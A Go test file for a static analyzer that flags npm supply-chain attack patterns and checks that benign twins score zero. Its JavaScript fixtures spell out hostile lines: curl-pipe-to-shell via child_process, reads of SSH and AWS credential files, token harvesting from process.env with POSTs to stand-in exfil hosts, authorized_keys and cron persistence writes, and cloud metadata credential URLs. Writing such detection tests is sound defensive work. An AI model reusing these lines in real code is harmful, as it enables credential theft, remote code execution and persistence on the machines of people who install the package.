package node

import (
	"context"
	"errors"
	"iter"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/sarahmaeve/signatory/internal/signal/source/astfeature"
)

// seq builds an iter.Seq2 from explicit (file, err) pairs so tests
// can drive the analyzer's stream-error and drain behavior exactly.
func seq(pairs ...struct {
	f   astfeature.SourceFile
	err error
}) iter.Seq2[astfeature.SourceFile, error] {
	return func(yield func(astfeature.SourceFile, error) bool) {
		for _, p := range pairs {
			if !yield(p.f, p.err) {
				return
			}
		}
	}
}

type fe = struct {
	f   astfeature.SourceFile
	err error
}

func TestAnalyzer_Language(t *testing.T) {
	t.Parallel()
	assert.Equal(t, "javascript", NewAnalyzer().Language(),
		"Language() feeds ecosystemForLanguage(\"javascript\")→\"npm\"")
}

func TestAnalyzer_Analyze_CleanFileHasZeroCounts(t *testing.T) {
	t.Parallel()
	a := NewAnalyzer()
	counts, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "src/index.js", Content: []byte(
			"function add(a, b) { return a + b; }\nmodule.exports = { add };\n")}},
	))
	require.NoError(t, err)
	assert.Equal(t, astfeature.Counts{}, counts,
		"a benign module that only defines/exports functions spikes nothing")
}

// TestAnalyzer_Analyze_WeaponizedModulePayload is the load-bearing
// adversarial fixture: the dominant npm supply-chain shape — a
// require()'d child_process running a shell command, network exfil,
// credential read, and eval, all at module (import/require) time.
// Every counted field must light up; the function body's eval must
// NOT inflate ImportTimeCallSites.
func TestAnalyzer_Analyze_WeaponizedModulePayload(t *testing.T) {
	t.Parallel()
	src := "" +
		"const cp = require('child_process');\n" +
		"cp.execSync('curl evil.example | sh');\n" +
		"require('https').get('http://evil.example/exfil');\n" +
		"const fs = require('fs');\n" +
		"fs.readFileSync('/root/.ssh/id_rsa');\n" +
		"let k = 0;\n" +
		"k ^= 0x37;\n" +
		"eval(payload);\n" +
		"function helper() { eval(x); }\n"
	a := NewAnalyzer()
	c, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "index.js", Content: []byte(src)}},
	))
	require.NoError(t, err)

	assert.Equal(t, 2, c.DynamicEvalCalls, "eval at module scope + eval in helper()")
	assert.Equal(t, 1, c.ExecCalls, "child_process.execSync via require-bound alias")
	assert.Equal(t, 1, c.NetworkCallSites, "https.get via inline require chain")
	assert.Equal(t, 1, c.SensitivePathReads, "fs.readFileSync('/root/.ssh/id_rsa')")
	assert.Equal(t, 1, c.XORAssignments, "k ^= 0x37")
	assert.Equal(t, 4, c.ImportTimeCallSites,
		"module-scope calls: cp.execSync, https.get, fs.readFileSync, eval "+
			"(the eval in helper() is NOT import-time)")
	assert.Equal(t, 0, c.InitCount, "no Go-style init analog")
	assert.Equal(t, 0, c.InstallHookOverrides,
		"npm install hooks are package.json scripts (covered by the npm "+
			"registry collector), never source — stays 0 by design")
}

// TestAnalyzer_Analyze_DynamicEvalIsSpecific: a method merely named
// .eval / .exec, and regex .exec, must NOT count as code-from-data
// execution. Only bare eval, the Function constructor, and vm.run* do.
// Miscounting .exec would spike on the first regex a package uses.
func TestAnalyzer_Analyze_DynamicEvalIsSpecific(t *testing.T) {
	t.Parallel()
	src := "" +
		"const re = /x/;\n" +
		"re.exec(s);\n" + // regex exec — NOT dynamic eval
		"db.query(q).eval();\n" + // method named eval — NOT
		"eval(p);\n" + // dynamic eval
		"new Function('a', 'return a')();\n" + // dynamic eval (Function ctor)
		"vm.runInThisContext(code);\n" // dynamic eval
	a := NewAnalyzer()
	c, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "m.js", Content: []byte(src)}},
	))
	require.NoError(t, err)
	assert.Equal(t, 3, c.DynamicEvalCalls,
		"only bare eval, new Function, vm.runInThisContext — not re.exec or .eval()")
}

// TestAnalyzer_Analyze_PayloadDecodeCatalog: obfuscated stages arrive
// gzip/inflate/brotli-compressed or atob-encoded. The Base64DecodeCalls
// field is "opaque payload decode" by intent. JSON.parse / ordinary
// string ops must not count.
func TestAnalyzer_Analyze_PayloadDecodeCatalog(t *testing.T) {
	t.Parallel()
	src := "" +
		"atob(blob);\n" +
		"zlib.gunzipSync(buf);\n" +
		"zlib.brotliDecompressSync(buf);\n" +
		"JSON.parse(s);\n" + // NOT a payload decode
		"s.trim();\n" // NOT
	a := NewAnalyzer()
	c, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "d.js", Content: []byte(src)}},
	))
	require.NoError(t, err)
	assert.Equal(t, 3, c.Base64DecodeCalls,
		"atob + zlib.gunzipSync + zlib.brotliDecompressSync; not JSON.parse/trim")
}

// TestAnalyzer_Analyze_NodeSchemeSpecifier: ESM `node:` builtin
// specifiers must resolve the same as the bare names so the catalog
// matches `import { execSync } from 'node:child_process'`.
func TestAnalyzer_Analyze_NodeSchemeSpecifier(t *testing.T) {
	t.Parallel()
	src := "" +
		"import { execSync } from 'node:child_process';\n" +
		"execSync('id');\n"
	a := NewAnalyzer()
	c, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "esm.mjs", Content: []byte(src)}},
	))
	require.NoError(t, err)
	assert.Equal(t, 1, c.ExecCalls,
		"node:child_process must normalize to child_process for catalog match")
}

// TestAnalyzer_Analyze_BenignNetworkClientScoresZeroExec: a typical
// library that does an https.get inside an exported function flags
// NetworkCallSites (the catalog is scope-independent) but must not
// invent exec/eval/credential signal — the no-false-positive baseline.
func TestAnalyzer_Analyze_BenignNetworkClientScoresZero(t *testing.T) {
	t.Parallel()
	src := "" +
		"const https = require('https');\n" +
		"function fetchThing(u, cb) { return https.get(u, cb); }\n" +
		"module.exports = fetchThing;\n"
	a := NewAnalyzer()
	c, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "client.js", Content: []byte(src)}},
	))
	require.NoError(t, err)
	assert.Equal(t, 1, c.NetworkCallSites, "https.get is real network surface")
	assert.Equal(t, 0, c.ExecCalls)
	assert.Equal(t, 0, c.DynamicEvalCalls)
	assert.Equal(t, 0, c.SensitivePathReads)
	assert.Equal(t, 0, c.ImportTimeCallSites,
		"the only call is inside an exported function — nothing runs on require")
}

func TestAnalyzer_Analyze_LenientOnUnparseableFile(t *testing.T) {
	t.Parallel()
	// A garbage file contributes nothing rather than aborting the
	// version's whole tree; a following good file still counts.
	a := NewAnalyzer()
	c, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "broken.ts", Content: []byte("}{)(=>=>`${")}},
		fe{f: astfeature.SourceFile{Path: "ok.js", Content: []byte("eval(x);\n")}},
	))
	require.NoError(t, err)
	assert.Equal(t, 1, c.DynamicEvalCalls, "the good file still contributes")
}

func TestAnalyzer_Analyze_PropagatesUpstreamStreamError(t *testing.T) {
	t.Parallel()
	// Same contract as golang.Analyzer: a mid-stream provider error
	// aborts with that error rather than silently yielding empty
	// counts, so the assembler does not record a misleading all-zero
	// row.
	wantErr := errors.New("blob fetch boom")
	a := NewAnalyzer()
	_, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "ok.js", Content: []byte("x = 1;\n")}},
		fe{err: wantErr},
	))
	assert.ErrorIs(t, err, wantErr)
}

func TestAnalyzer_Analyze_HonorsContextCancellation(t *testing.T) {
	t.Parallel()
	a := NewAnalyzer()
	ctx, cancel := context.WithCancel(t.Context())
	cancel()
	_, err := a.Analyze(ctx, seq(
		fe{f: astfeature.SourceFile{Path: "a.js", Content: []byte("x = 1;\n")}},
	))
	assert.ErrorIs(t, err, ctx.Err())
}

// TestAnalyzer_BareCatalogEntriesAreGlobalOnly pins the bare-entry
// specificity contract for matchesCatalog. The networkCallees catalog
// has both dotted entries (http.get, axios.post — alias-resolved
// method calls) and BARE entries — the globals fetch / atob / got /
// superagent and the default-imported callable axios. The docstring
// at networkCallees promises bare entries match "the global (fetch)
// or the default-imported callable (axios(...))" only; a method
// merely named .fetch on an LRU cache is NOT the global fetch and
// must score zero — AST.md §4 forbids exactly this class of false
// positive.
//
// Red test for H1: today matchesCatalog uses HasSuffix(callee,
// "."+entry) for every entry, so cache.fetch('key') from lru-cache
// (one of the most-installed npm packages) spikes NetworkCallSites
// with zero actual network surface. The same overshoot hits
// decoder.atob(...) on the decode catalog. The fix narrows bare
// entries to exact-match-only; dotted entries keep the suffix-form
// match so alias-resolved http.get / axios.post calls still hit.
func TestAnalyzer_BareCatalogEntriesAreGlobalOnly(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name       string
		src        string
		checkField string // "network" or "base64decode"
	}{
		{
			name:       "lru-cache .fetch is not the global fetch",
			src:        "cache.fetch('user:1');\n",
			checkField: "network",
		},
		{
			name:       "wrapped decoder .atob is not the global atob",
			src:        "decoder.atob(blob);\n",
			checkField: "base64decode",
		},
		{
			name:       "method .got is not the got HTTP client",
			src:        "results.got(key);\n",
			checkField: "network",
		},
		{
			name:       "method .superagent is not the superagent client",
			src:        "manager.superagent(request);\n",
			checkField: "network",
		},
		{
			name:       "method .axios is not the axios client",
			src:        "wrappers.axios(request);\n",
			checkField: "network",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			c := counts(t, tc.src)
			switch tc.checkField {
			case "network":
				assert.Equal(t, 0, c.NetworkCallSites,
					"bare catalog entries must match the global ONLY — "+
						"obj.<name> is not the global; src=%q", tc.src)
			case "base64decode":
				assert.Equal(t, 0, c.Base64DecodeCalls,
					"bare catalog entries must match the global ONLY — "+
						"obj.<name> is not the global; src=%q", tc.src)
			}
		})
	}
}

// TestAnalyzer_BareGlobalsAndDottedSuffixesStillMatch is the regression
// test for the other side of the H1 fix — pin that narrowing
// matchesCatalog's bare-entry rule did NOT over-narrow. The bare
// globals (fetch(...), atob(...)) and the default-imported callable
// (axios(...) when bound by a require/import) must still fire, and
// the dotted-entry suffix-match path (alias-resolved `cp.execSync` →
// `child_process.execSync`, named-import `https.get` from a
// `require('https')` binding) must keep working — it's how virtually
// every weaponized payload lands a hit.
func TestAnalyzer_BareGlobalsAndDottedSuffixesStillMatch(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name               string
		src                string
		wantNetwork        int
		wantBase64Decode   int
		wantExecCalls      int
		wantImportTimeCall int
	}{
		{
			name:               "global fetch is network",
			src:                "fetch('https://api.example.com/v1');\n",
			wantNetwork:        1,
			wantImportTimeCall: 1,
		},
		{
			name:               "global atob is decode",
			src:                "atob(blob);\n",
			wantBase64Decode:   1,
			wantImportTimeCall: 1,
		},
		{
			name: "axios default-imported callable is network",
			src: "const axios = require('axios');\n" +
				"axios({ url: '/x' });\n",
			wantNetwork:        1,
			wantImportTimeCall: 1,
		},
		{
			name:               "dotted axios.post is network",
			src:                "axios.post('/x', body);\n",
			wantNetwork:        1,
			wantImportTimeCall: 1,
		},
		{
			name: "alias-resolved cp.execSync is exec",
			src: "const cp = require('child_process');\n" +
				"cp.execSync('id');\n",
			wantExecCalls:      1,
			wantImportTimeCall: 1,
		},
		{
			name: "destructured https.get suffix-matches via alias",
			src: "const { get } = require('https');\n" +
				"get('http://example.com');\n",
			wantNetwork:        1,
			wantImportTimeCall: 1,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			c := counts(t, tc.src)
			assert.Equal(t, tc.wantNetwork, c.NetworkCallSites,
				"NetworkCallSites for %q", tc.name)
			assert.Equal(t, tc.wantBase64Decode, c.Base64DecodeCalls,
				"Base64DecodeCalls for %q", tc.name)
			assert.Equal(t, tc.wantExecCalls, c.ExecCalls,
				"ExecCalls for %q", tc.name)
			assert.Equal(t, tc.wantImportTimeCall, c.ImportTimeCallSites,
				"ImportTimeCallSites for %q (the call runs at module scope)",
				tc.name)
		})
	}
}

// ============================================================
// Real-incident fixture corpus. Each models the *technique* of a
// named npm supply-chain incident (not the verbatim payload) and
// asserts the Counts that must fire, plus a benign twin that must
// score zero — the no-false-positive baseline AST.md §3 requires.
// ============================================================

func counts(t *testing.T, src string) astfeature.Counts {
	t.Helper()
	c, err := NewAnalyzer().Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "index.js", Content: []byte(src)}},
	))
	require.NoError(t, err)
	return c
}

// TestIncident_EventStream models event-stream / flatmap-stream
// (2018): a runtime-decoded payload executed via the Function
// constructor. The decode-then-execute pair is the fingerprint —
// Base64DecodeCalls AND DynamicEvalCalls must both spike. This is the
// fixture that demands Buffer.from(x,'base64') second-arg resolution
// (AST.md: a resolver addition is justified by a real incident).
func TestIncident_EventStream(t *testing.T) {
	t.Parallel()
	malicious := "" +
		"const blob = 'ZG9Tb21ldGhpbmcoKQ==';\n" +
		"const payload = Buffer.from(blob, 'base64').toString();\n" +
		"new Function(payload)();\n"
	c := counts(t, malicious)
	assert.Positive(t, c.DynamicEvalCalls, "new Function(decoded) is code-from-data execution")
	assert.Positive(t, c.Base64DecodeCalls,
		"Buffer.from(x,'base64') is THE npm payload-decode primitive — "+
			"the decode+exec pair is the event-stream fingerprint")
	assert.Positive(t, c.ImportTimeCallSites, "the payload runs at require time")

	// Benign twin: Buffer.from with no decode encoding, and no
	// dynamic execution, must score zero.
	benign := "" +
		"const buf = Buffer.from([1, 2, 3]);\n" +
		"const s = Buffer.from('hello', 'utf8').toString();\n" +
		"module.exports = { buf, s };\n"
	bc := counts(t, benign)
	assert.Equal(t, 0, bc.Base64DecodeCalls,
		"Buffer.from(array) and Buffer.from(x,'utf8') are ordinary "+
			"buffer construction — never a payload decode")
	assert.Equal(t, 0, bc.DynamicEvalCalls)
}

// TestIncident_UAParserJS models ua-parser-js / coa / rc (2021): the
// hijacked release shipped code that shelled out to download and run
// a miner. require('child_process').<exec-family>(...) must count as
// ExecCalls across the variants real droppers use.
func TestIncident_UAParserJS(t *testing.T) {
	t.Parallel()
	for _, method := range []string{"exec", "execSync", "spawn", "spawnSync", "execFile"} {
		t.Run(method, func(t *testing.T) {
			t.Parallel()
			src := "require('child_process')." + method + "('curl -s http://evil/x.sh | bash');\n"
			c := counts(t, src)
			assert.Positivef(t, c.ExecCalls,
				"child_process.%s via inline require chain must count as exec", method)
			assert.Positive(t, c.ImportTimeCallSites, "runs at require time")
		})
	}

	// No-false-positive: a method merely named .exec on something
	// that is not child_process (sqlite db handle, regex) must NOT
	// count — the specificity is the signal.
	benign := "" +
		"const db = require('better-sqlite3')('x.db');\n" +
		"db.exec('CREATE TABLE t(x)');\n" +
		"const re = /a/; re.exec('abc');\n"
	bc := counts(t, benign)
	assert.Equal(t, 0, bc.ExecCalls,
		"db.exec / regex.exec share a name with child_process.exec but "+
			"are not process execution — must not flag")
}

// TestIncident_NodeIPC models node-ipc (2022): geo-gated destructive
// behavior plus a network call to resolve geo-IP. We catch the
// network surface; the destructive fs.writeFile loop has NO Counts
// field (a model-level gap shared across all language analyzers, not
// a node bug — surfaced honestly, not silently). The test pins what
// we DO detect and asserts we don't invent signal we lack.
func TestIncident_NodeIPC(t *testing.T) {
	t.Parallel()
	malicious := "" +
		"const https = require('https');\n" +
		"https.get('https://api.ipgeolocation.io/ipgeo?apiKey=x', (r) => r);\n" +
		"const fs = require('fs');\n" +
		"fs.writeFileSync(targetPath, '\\u2764');\n"
	c := counts(t, malicious)
	assert.Positive(t, c.NetworkCallSites, "https.get for geo-IP is real network egress")
	assert.Equal(t, 0, c.ExecCalls, "no process execution in this shape")
	assert.Equal(t, 0, c.DynamicEvalCalls)
	// fs.writeFileSync destruction is intentionally uncounted: there
	// is no destructive-write Counts field. Documenting via assertion
	// so a future schema decision is a deliberate, visible change.
	assert.Equal(t, 0, c.SensitivePathReads,
		"writeFileSync is a write, not a sensitive READ — out of model scope")
}

// TestIncident_ShaiHulud models the credential-harvest worm shape
// (2025–26, design/threat-landscape/*): read npm/cloud credentials
// and exfil them on install/require. A statically-resolvable
// credential path is a true positive; the dynamic-path variant is a
// documented conservative miss (parity with python's pathlib gap) —
// both asserted so the boundary is explicit.
func TestIncident_ShaiHulud(t *testing.T) {
	t.Parallel()

	// Resolvable literal credential path → true positive.
	hardcoded := "" +
		"const fs = require('fs');\n" +
		"const creds = fs.readFileSync('/root/.aws/credentials', 'utf8');\n" +
		"require('https').request('https://exfil.evil/c', { method: 'POST' });\n"
	c := counts(t, hardcoded)
	assert.Positive(t, c.SensitivePathReads,
		"fs.readFileSync('/root/.aws/credentials') is credential theft")
	assert.Positive(t, c.NetworkCallSites, "https.request is the exfil channel")

	// Dynamic path via os.homedir() — unresolved by the static
	// resolver (call result), so SensitivePathReads is a conservative
	// MISS. Network still fires; the anomaly still trips on the pair.
	dynamic := "" +
		"const fs = require('fs');\n" +
		"const os = require('os');\n" +
		"fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');\n" +
		"require('https').request('https://exfil.evil/c', { method: 'POST' });\n"
	d := counts(t, dynamic)
	assert.Equal(t, 0, d.SensitivePathReads,
		"os.homedir()+'/.npmrc' is a runtime-built path — documented "+
			"conservative miss, never a false guess")
	assert.Positive(t, d.NetworkCallSites,
		"network exfil still fires, so the decode/read+exfil anomaly "+
			"still trips even when the path itself is unresolved")

	// Benign twin: reading a non-sensitive resolvable path.
	benign := "const fs = require('fs');\nfs.readFileSync('./package.json', 'utf8');\n"
	b := counts(t, benign)
	assert.Equal(t, 0, b.SensitivePathReads,
		"reading ./package.json is ordinary I/O — must not flag")
}

// TestThreat_EnvCredentialHarvest models the dominant npm
// credential-harvest primitive (TanStack/litellm/bufferzonecorp):
// reading named cloud/CI secrets out of process.env. All three access
// shapes — dotted, computed-string, and destructured — must count;
// ordinary config env reads must not.
func TestThreat_EnvCredentialHarvest(t *testing.T) {
	t.Parallel()
	malicious := "" +
		"const a = process.env.AWS_SECRET_ACCESS_KEY;\n" +
		"const b = process.env['NPM_TOKEN'];\n" +
		"const { GITHUB_TOKEN, VAULT_TOKEN } = process.env;\n" +
		"require('https').request('https://exfil.evil', { method: 'POST' });\n"
	c := counts(t, malicious)
	assert.GreaterOrEqual(t, c.EnvCredentialReads, 4,
		"AWS_SECRET_ACCESS_KEY, NPM_TOKEN, GITHUB_TOKEN, VAULT_TOKEN — "+
			"dotted, computed, and destructured reads all count")
	assert.Positive(t, c.NetworkCallSites, "the exfil channel still fires")

	benign := "" +
		"const env = process.env.NODE_ENV || 'production';\n" +
		"const port = process.env.PORT;\n" +
		"const dbg = process.env['DEBUG'];\n"
	bc := counts(t, benign)
	assert.Equal(t, 0, bc.EnvCredentialReads,
		"NODE_ENV/PORT/DEBUG are ordinary config — must not spike a "+
			"credential read (catalog-matched, not any-env-read)")
}

// TestThreat_PersistenceWrites models the recurring post-exploitation
// step (TanStack .claude/.vscode, bufferzonecorp authorized_keys
// append, node-ipc): writing to a persistence / credential-tamper
// path. Resolvable persistence paths count; a runtime-built path is a
// conservative miss; ordinary build output must not flag.
func TestThreat_PersistenceWrites(t *testing.T) {
	t.Parallel()
	malicious := "" +
		"const fs = require('fs');\n" +
		"fs.appendFileSync('/home/ci/.ssh/authorized_keys', attackerKey);\n" +
		"require('fs').writeFileSync('/etc/cron.d/sysmon', job);\n" +
		"fs.createWriteStream(process.env.HOME + '/.bashrc');\n"
	c := counts(t, malicious)
	assert.Equal(t, 2, c.SensitivePathWrites,
		"authorized_keys append + /etc/cron.d write are resolvable "+
			"persistence writes; the HOME+'/.bashrc' path is runtime-built "+
			"(conservative miss, never a false guess)")

	benign := "const fs = require('fs');\nfs.writeFileSync('./dist/bundle.js', code);\n"
	bc := counts(t, benign)
	assert.Equal(t, 0, bc.SensitivePathWrites,
		"writing build output is ordinary I/O — must not flag")
}

// TestThreat_CloudMetadataPivot models the SSRF-to-IMDS credential
// mint (TanStack AWS IMDSv2, litellm). A metadata-host destination is
// counted distinctly from ordinary egress (near-zero false positive);
// a normal API call is NetworkCallSites, not CloudMetadataCalls.
func TestThreat_CloudMetadataPivot(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name string
		url  string
	}{
		{"aws imds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
		{"ecs task role", "http://169.254.170.2/v2/credentials"},
		{"gcp metadata", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			c := counts(t, "require('http').get('"+tc.url+"');\n")
			assert.Equalf(t, 1, c.CloudMetadataCalls,
				"%s is an instance-metadata endpoint", tc.url)
			assert.Equalf(t, 0, c.NetworkCallSites,
				"a metadata call is counted as cloud-metadata, not generic egress (%s)", tc.url)
		})
	}

	benign := counts(t, "require('https').get('https://api.example.com/v1/things');\n")
	assert.Equal(t, 0, benign.CloudMetadataCalls)
	assert.Positive(t, benign.NetworkCallSites,
		"an ordinary API call is generic network egress, not metadata")
}

// TestThreat_DynamicRequireIsCodeFromData: require()/import() of a
// non-literal is the same code-from-data indirection as eval — the
// obfuscated-dropper shape — and counts as DynamicEvalCalls. A static
// literal require/import is an ordinary dependency load and must not.
func TestThreat_DynamicRequireIsCodeFromData(t *testing.T) {
	t.Parallel()
	mal := counts(t, ""+
		"require(decodeURIComponent(stage1));\n"+
		"const m = 'ch' + 'ild_process';\nrequire(m);\n"+
		"import(attackerControlled);\n")
	assert.GreaterOrEqual(t, mal.DynamicEvalCalls, 3,
		"require(call-result), require(name), import(name) are all "+
			"code-from-data module loads")

	ben := counts(t, ""+
		"const fs = require('fs');\n"+
		"require('child_process');\n"+
		"import('./lazy-feature.js');\n")
	assert.Equal(t, 0, ben.DynamicEvalCalls,
		"static string require/import is an ordinary dependency load")
}
